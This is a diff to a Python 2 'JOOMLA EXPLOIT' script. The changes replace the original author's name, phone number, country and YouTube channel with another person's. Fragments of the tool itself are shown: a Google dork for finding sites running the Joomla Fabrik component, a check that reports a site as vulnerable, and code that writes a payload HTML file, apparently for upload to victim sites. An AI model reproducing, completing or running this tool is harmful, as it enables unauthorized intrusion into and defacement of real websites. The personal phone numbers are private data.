@@ -1,10 +1,10 @@
 #!/bin/env python2
-# Script owner="CarZaGo"
-# Created on date 01/01/2009
-# Modified on date 19/03/2019
-# Whats app number +51 958 014 206 
+# Script owner="sachin"
+# Created on date 27/10/2018
+# Modified on date 1/11/2018
+# Whats app number 8105190452 
 # if u get any bugs send to this number
-# i am studying 10th year informática
+# i am studying 4th year civil
 #
 
 import os
@@ -102,15 +102,13 @@ else:
 
 
 logo2 = '''
-Coded by CarZaGo
-
+Coded by Sachin
 \t   |  |-------    __     _____  
 \t   |  |       |  /  \   |       |   \033[1;39m VERSION : \033[1;32m1.4\033[1;39m
 \t\033[1;36m   |  |       | |    |  |_____  |   \033[1;32m JOOMLA EXPLOIT\033[1;36m
 \t   |  |       | |    |        | |_____
 \t   |  |       | |    |        | |     |
 \t|__/  |-------   \__/ \ ______| |     |
-
 '''
 print logo2
 print "\033[1;31mDork :\033[1;39m inurl:index.php/component/fabrik/ site:\033[1;39m"
@@ -149,10 +147,10 @@ while True:
 		scanner()
 	 elif coder[0] == "about":
 		print '\033[1;39m'
-		print '\t Name   : CarZaGo'
-		print '\t Country: Perú'
-		print '\t Channel: llCarZaGoll'
-		print '\t Link   : https://www.youtube.com/user/llCarZaGoll'
+		print '\t Name   : Sachin'
+		print '\t Country: India'
+		print '\t Channel: BBSAD'
+		print '\t Link   : https://youtu.be/87GMKQq_nTs'
 		print '\t'
 
 	 elif coder[0] == "-h":
@@ -221,10 +219,10 @@ while True:
 			print ''
 		else:
 			print "[+] Site is vulnerable"
-			CarZaGo = "payload/index.html"
+			sachin = "payload/index.html"
 
-			if os.path.exists(CarZaGo):
-				os.remove(CarZaGo)
+			if os.path.exists(sachin):
+				os.remove(sachin)
 
 			expl = open("payload/index.html" , "w")
 			expl.write("<html><head> \n")
